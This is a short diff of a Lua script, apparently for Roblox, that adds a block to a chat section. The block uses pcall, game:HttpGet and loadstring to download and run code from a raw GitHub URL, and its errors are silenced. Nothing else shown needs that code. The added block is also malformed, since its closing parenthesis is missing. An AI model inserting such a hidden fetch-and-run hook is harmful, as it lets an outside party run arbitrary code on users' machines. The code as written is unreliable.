@@ -582,6 +582,10 @@ end)
 
 -- Chatted --
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NganHa2k3/RobloxScript/refs/heads/item/AnimE"))()
+end
+
 local players = game.Players.LocalPlayer
 
 DisplayChat_Message("۝ " .. players.DisplayName .. ": I'mma do scripting... !")
